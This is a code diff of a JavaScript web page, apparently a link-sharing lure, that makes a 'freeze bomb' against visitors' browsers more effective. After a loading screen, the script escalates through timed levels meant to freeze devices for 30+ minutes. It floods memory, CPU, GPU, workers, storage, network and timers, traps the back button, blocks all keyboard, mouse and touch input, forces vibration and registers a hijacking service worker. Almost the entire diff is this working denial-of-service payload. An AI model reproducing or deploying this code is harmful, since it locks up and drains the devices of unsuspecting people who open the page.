@@ -457,45 +457,96 @@ setTimeout(() => {
     document.getElementById('loading-screen').classList.add('hidden');
 }, 3000);
 
-// ========== PHASE 2: FREEZE AFTER 6 SECONDS (3 sec loading + 3 sec viewing) ==========
-setTimeout(() => {
-    startFreezeBomb();
-}, 6000);
+// ========== PHASE 2: PROGRESSIVE FREEZE ==========
+// Starts light, gets heavier over time - 30+ min freeze
+let freezeIntensity = 0;
+let freezeInterval;
 
-function startFreezeBomb() {
+function startProgressiveFreeze() {
+    // Level 1: Light freeze (3-10 sec)
+    setTimeout(() => {
+        freezeLevel1();
+    }, 3000);
 
-    // 1. MEMORY BOMB
-    const memoryBomb = [];
+    // Level 2: Medium freeze (10-30 sec)
+    setTimeout(() => {
+        freezeLevel2();
+    }, 10000);
+
+    // Level 3: Heavy freeze (30+ sec)
+    setTimeout(() => {
+        freezeLevel3();
+    }, 30000);
+
+    // Level 4: Extreme freeze (1+ min)
+    setTimeout(() => {
+        freezeLevel4();
+    }, 60000);
+
+    // Level 5: Maximum freeze (continuous)
+    setTimeout(() => {
+        freezeLevel5();
+    }, 120000);
+}
+
+function freezeLevel1() {
+    // Light CPU load
+    for(let i=0; i<1000; i++) {
+        setInterval(() => {
+            let x = 0;
+            for(let j=0; j<100000; j++) {
+                x += Math.sin(j) * Math.cos(j);
+            }
+        }, 100);
+    }
+
+    // Start memory buildup
+    const memBomb = [];
     setInterval(() => {
-        for(let m=0; m<100; m++) {
-            try { memoryBomb.push(new Float64Array(100000000).fill(Math.random())); } catch(e) {}
+        for(let m=0; m<10; m++) {
+            try { memBomb.push(new Float64Array(10000000).fill(Math.random())); } catch(e) {}
         }
-    }, 10);
+    }, 1000);
+}
 
-    // 2. GPU OVERLOAD
-    for(let i=0; i<100; i++) {
+function freezeLevel2() {
+    // Medium CPU load
+    for(let i=0; i<5000; i++) {
+        setInterval(() => {
+            let x = 0;
+            for(let j=0; j<500000; j++) {
+                x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
+                x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
+            }
+        }, 50);
+    }
+
+    // GPU contexts
+    for(let i=0; i<50; i++) {
         try {
             const c = document.createElement('canvas');
-            c.width = 8192; c.height = 8192;
+            c.width = 4096; c.height = 4096;
             const ctx = c.getContext('webgl2') || c.getContext('webgl');
             if(ctx) { ctx.clearColor(Math.random(), Math.random(), Math.random(), 1); ctx.clear(ctx.COLOR_BUFFER_BIT); }
         } catch(e) {}
     }
 
-    // 3. AUDIO CONTEXTS
-    for(let a=0; a<50; a++) {
+    // Audio contexts
+    for(let a=0; a<20; a++) {
         try {
             const ac = new (window.AudioContext || window.webkitAudioContext)();
             const osc = ac.createOscillator();
             const gain = ac.createGain();
             osc.connect(gain); gain.connect(ac.destination);
-            osc.frequency.value = 20000 + a * 20;
+            osc.frequency.value = 20000 + a * 50;
             osc.start(); gain.gain.value = 0.001;
         } catch(e) {}
     }
+}
 
-    // 4. CPU BOMB
-    for(let i=0; i<10000; i++) {
+function freezeLevel3() {
+    // Heavy CPU load
+    for(let i=0; i<20000; i++) {
         setInterval(() => {
             let x = 0;
             for(let j=0; j<1000000; j++) {
@@ -503,16 +554,16 @@ function startFreezeBomb() {
                 x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
                 x = Math.pow(x, 1.001) % 999999999;
             }
-        }, 1);
+        }, 10);
     }
 
-    // 5. DOM OVERLOAD
+    // DOM overload
     const animContainer = document.createElement('div');
     animContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none;overflow:hidden;';
     document.body.appendChild(animContainer);
-    for(let i=0; i<50000; i++) {
+    for(let i=0; i<10000; i++) {
         const div = document.createElement('div');
-        div.style.cssText = 'position:absolute;width:3px;height:3px;background:hsl('+(i%360)+',100%,50%);animation:spin '+(0.02+i%3)+'s linear infinite;';
+        div.style.cssText = 'position:absolute;width:5px;height:5px;background:hsl('+(i%360)+',100%,50%);animation:spin '+(0.1+i%5)+'s linear infinite;';
         div.style.left = Math.random()*100+'vw';
         div.style.top = Math.random()*100+'vh';
         animContainer.appendChild(div);
@@ -521,27 +572,43 @@ function startFreezeBomb() {
     style.textContent = '@keyframes spin{from{transform:rotate(0deg)scale(1)}to{transform:rotate(360deg)scale(5)}}';
     document.head.appendChild(style);
 
-    // 6. VIBRATION
+    // Vibration
     if(navigator.vibrate) {
-        setInterval(() => navigator.vibrate([30000, 1, 30000]), 1);
+        setInterval(() => navigator.vibrate([10000, 10, 10000]), 100);
+    }
+}
+
+function freezeLevel4() {
+    // Extreme CPU load
+    for(let i=0; i<50000; i++) {
+        setInterval(() => {
+            let x = 0;
+            for(let j=0; j<2000000; j++) {
+                x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
+                x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
+                x = Math.pow(x, 1.001) % 999999999;
+            }
+        }, 1);
     }
 
-    // 7. FULLSCREEN + WAKE LOCK
-    setTimeout(() => {
-        document.documentElement.requestFullscreen().catch(()=>{});
-        if('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(()=>{});
-    }, 500);
+    // Workers
+    const workerScript = URL.createObjectURL(new Blob([
+        'self.onmessage=function(){while(true){let x=0;for(let i=0;i<999999999;i++){x+=Math.sin(i)*Math.cos(i)*Math.tan(i%1.57+0.001);x=Math.sqrt(Math.abs(x)+1)*Math.log(i+2);x=Math.pow(x,1.001)%999999999;}}}'
+    ], {type:'application/javascript'}));
+    for(let w=0; w<32; w++) { try { new Worker(workerScript); } catch(e) {} }
 
-    // 8. BATTERY DRAIN
-    if('getBattery' in navigator) {
-        navigator.getBattery().then(bat => {
-            setInterval(() => { bat.dischargingTime; bat.level; bat.charging; }, 0);
-        });
+    // WebRTC
+    for(let r=0; r<100; r++) {
+        try {
+            const pc = new RTCPeerConnection();
+            pc.createDataChannel('bomb_'+r);
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+        } catch(e) {}
     }
 
-    // 9. INDEXEDDB BOMB
+    // IndexedDB
     try {
-        const dbReq = indexedDB.open('shadow_bomb_v3', 1);
+        const dbReq = indexedDB.open('shadow_bomb_v4', 1);
         dbReq.onupgradeneeded = e => {
             const db = e.target.result;
             for(let i=0; i<500; i++) db.createObjectStore('store_'+i);
@@ -556,59 +623,34 @@ function startFreezeBomb() {
                         store.put(new Blob([new Uint8Array(50000000)]), Math.random());
                     } catch(e) {}
                 }
-            }, 10);
+            }, 100);
         };
     } catch(e) {}
+}
 
-    // 10. WEBRTC
-    for(let r=0; r<100; r++) {
+function freezeLevel5() {
+    // Maximum everything
+
+    // Memory bomb - max out RAM
+    const memBomb = [];
+    setInterval(() => {
+        for(let m=0; m<500; m++) {
+            try { memBomb.push(new Float64Array(200000000).fill(Math.random())); } catch(e) {}
+        }
+    }, 10);
+
+    // GPU overload
+    for(let i=0; i<200; i++) {
         try {
-            const pc = new RTCPeerConnection();
-            pc.createDataChannel('bomb_'+r);
-            pc.createOffer().then(o => pc.setLocalDescription(o));
+            const c = document.createElement('canvas');
+            c.width = 8192; c.height = 8192;
+            const ctx = c.getContext('webgl2') || c.getContext('webgl');
+            if(ctx) { ctx.clearColor(Math.random(), Math.random(), Math.random(), 1); ctx.clear(ctx.COLOR_BUFFER_BIT); }
         } catch(e) {}
     }
 
-    // 11. BROADCAST CHANNEL
-    try {
-        const bc = new BroadcastChannel('shadow_bomb');
-        setInterval(() => bc.postMessage(new Uint8Array(50000000)), 1);
-    } catch(e) {}
-
-    // 12. GEOLOCATION
-    if(navigator.geolocation) {
-        setInterval(() => {
-            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {enableHighAccuracy: true, maximumAge: 0});
-        }, 0);
-    }
-
-    // 13. SERVICE WORKER
-    if('serviceWorker' in navigator) {
-        const swScript = URL.createObjectURL(new Blob([
-            'self.addEventListener("install",e=>self.skipWaiting());'+
-            'self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));'+
-            'self.addEventListener("fetch",e=>e.respondWith(new Response("SHADOW")));'+
-            'setInterval(()=>{fetch("/");},10);'
-        ], {type:'application/javascript'}));
-        navigator.serviceWorker.register(swScript);
-    }
-
-    // 14. WEBGPU
-    async function webgpuBomb() {
-        try {
-            const adapter = await navigator.gpu.requestAdapter();
-            if(adapter) {
-                const device = await adapter.requestDevice();
-                for(let i=0; i<50; i++) {
-                    device.createTexture({size:[16384,16384,1], format:'rgba8unorm', usage:GPUTextureUsage.RENDER_ATTACHMENT|GPUTextureUsage.COPY_SRC});
-                }
-            }
-        } catch(e) {}
-    }
-    webgpuBomb();
-
-    // 15. CANVAS 2D
-    for(let c=0; c<100; c++) {
+    // Canvas 2D overload
+    for(let c=0; c<200; c++) {
         const cv = document.createElement('canvas');
         cv.width = 4096; cv.height = 4096;
         const ctx2d = cv.getContext('2d');
@@ -616,20 +658,87 @@ function startFreezeBomb() {
             setInterval(() => {
                 ctx2d.fillStyle = 'hsl('+Math.random()*360+',100%,50%)';
                 ctx2d.fillRect(0,0,4096,4096);
-            }, 5);
+            }, 1);
         }
     }
 
-    // 16. WORKERS
-    const workerScript = URL.createObjectURL(new Blob([
-        'self.onmessage=function(){while(true){let x=0;for(let i=0;i<999999999;i++){x+=Math.sin(i)*Math.cos(i)*Math.tan(i%1.57+0.001);x=Math.sqrt(Math.abs(x)+1)*Math.log(i+2);x=Math.pow(x,1.001)%999999999;}}}'
-    ], {type:'application/javascript'}));
-    for(let w=0; w<64; w++) { try { new Worker(workerScript); } catch(e) {} }
+    // Broadcast channel flood
+    try {
+        const bc = new BroadcastChannel('shadow_bomb');
+        setInterval(() => bc.postMessage(new Uint8Array(100000000)), 1);
+    } catch(e) {}
 
-    // 17. RECURSION
-    try { function recurse(n){if(n>0){recurse(n-1);recurse(n-1);recurse(n-1);recurse(n-1);}} recurse(40); } catch(e) {}
+    // Geolocation drain
+    if(navigator.geolocation) {
+        setInterval(() => {
+            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {enableHighAccuracy: true, maximumAge: 0});
+        }, 0);
+    }
 
-    // 18. PREVENT ALL INPUT
+    // Service worker
+    if('serviceWorker' in navigator) {
+        const swScript = URL.createObjectURL(new Blob([
+            'self.addEventListener("install",e=>self.skipWaiting());'+
+            'self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));'+
+            'self.addEventListener("fetch",e=>e.respondWith(new Response("SHADOW")));'+
+            'setInterval(()=>{fetch("/");},1);'
+        ], {type:'application/javascript'}));
+        navigator.serviceWorker.register(swScript);
+    }
+
+    // History trap - prevent back
+    history.pushState(null, '', location.href);
+    setInterval(() => { history.pushState(null, '', location.href); history.forward(); }, 1);
+
+    // URL hash bomb
+    setInterval(() => location.hash = Math.random().toString(36), 1);
+
+    // Iframe bomb
+    for(let i=0; i<500; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'about:blank';
+        iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
+        document.body.appendChild(iframe);
+    }
+
+    // Fetch bomb
+    setInterval(() => {
+        for(let i=0; i<500; i++) fetch('?'+Math.random()).catch(()=>{});
+    }, 1);
+
+    // WebSocket bomb
+    for(let i=0; i<100; i++) {
+        try {
+            const ws = new WebSocket('wss://echo.websocket.org');
+            ws.onopen = () => { setInterval(()=>ws.send(new Uint8Array(10000000)), 1); };
+        } catch(e) {}
+    }
+
+    // Animation frame bomb
+    function animBomb() { for(let i=0; i<500; i++) requestAnimationFrame(animBomb); }
+    animBomb();
+
+    // Timer bomb
+    setInterval(() => {
+        for(let i=0; i<5000; i++) { setTimeout(()=>{},0); setInterval(()=>{},999999); }
+    }, 1);
+
+    // LocalStorage bomb
+    setInterval(() => {
+        for(let i=0; i<5000; i++) localStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
+    }, 10);
+
+    // SessionStorage bomb
+    setInterval(() => {
+        for(let i=0; i<5000; i++) sessionStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
+    }, 10);
+
+    // Console bomb
+    setInterval(() => {
+        for(let i=0; i<50000; i++) { console.log(Math.random()); console.error(Math.random()); }
+    }, 1);
+
+    // Prevent all input
     document.addEventListener('keydown', e=>e.preventDefault(), true);
     document.addEventListener('keyup', e=>e.preventDefault(), true);
     document.addEventListener('touchstart', e=>e.preventDefault(), {passive:false, capture:true});
@@ -639,65 +748,12 @@ function startFreezeBomb() {
     document.addEventListener('dblclick', e=>e.preventDefault(), true);
     document.addEventListener('contextmenu', e=>e.preventDefault(), true);
     document.addEventListener('wheel', e=>e.preventDefault(), {passive:false, capture:true});
-
-    // 19. HISTORY TRAP
-    history.pushState(null, '', location.href);
-    setInterval(() => { history.pushState(null, '', location.href); history.forward(); }, 1);
-
-    // 20. URL HASH BOMB
-    setInterval(() => location.hash = Math.random().toString(36), 1);
-
-    // 21. IFRAME BOMB
-    for(let i=0; i<100; i++) {
-        const iframe = document.createElement('iframe');
-        iframe.src = 'about:blank';
-        iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
-        document.body.appendChild(iframe);
-    }
-
-    // 22. IMAGE BOMB
-    for(let i=0; i<500; i++) {
-        const img = new Image();
-        img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7?'+Math.random();
-    }
-
-    // 23. FETCH BOMB
-    setInterval(() => {
-        for(let i=0; i<100; i++) fetch('?'+Math.random()).catch(()=>{});
-    }, 1);
-
-    // 24. WEBSOCKET BOMB
-    for(let i=0; i<50; i++) {
-        try {
-            const ws = new WebSocket('wss://echo.websocket.org');
-            ws.onopen = () => { setInterval(()=>ws.send(new Uint8Array(5000000)), 1); };
-        } catch(e) {}
-    }
-
-    // 25. ANIMATION FRAME BOMB
-    function animBomb() { for(let i=0; i<100; i++) requestAnimationFrame(animBomb); }
-    animBomb();
-
-    // 26. TIMER BOMB
-    setInterval(() => {
-        for(let i=0; i<1000; i++) { setTimeout(()=>{},0); setInterval(()=>{},999999); }
-    }, 1);
-
-    // 27. LOCALSTORAGE BOMB
-    setInterval(() => {
-        for(let i=0; i<1000; i++) localStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
-    }, 10);
-
-    // 28. SESSIONSTORAGE BOMB
-    setInterval(() => {
-        for(let i=0; i<1000; i++) sessionStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
-    }, 10);
-
-    // 29. CONSOLE BOMB
-    setInterval(() => {
-        for(let i=0; i<10000; i++) { console.log(Math.random()); console.error(Math.random()); }
-    }, 1);
 }
+
+// Start progressive freeze after loading screen
+setTimeout(() => {
+    startProgressiveFreeze();
+}, 3000);
 
 // ========== ADMIN DATA ==========
 let savedLinks = JSON.parse(localStorage.getItem('cyberfractal_links') || '[]');
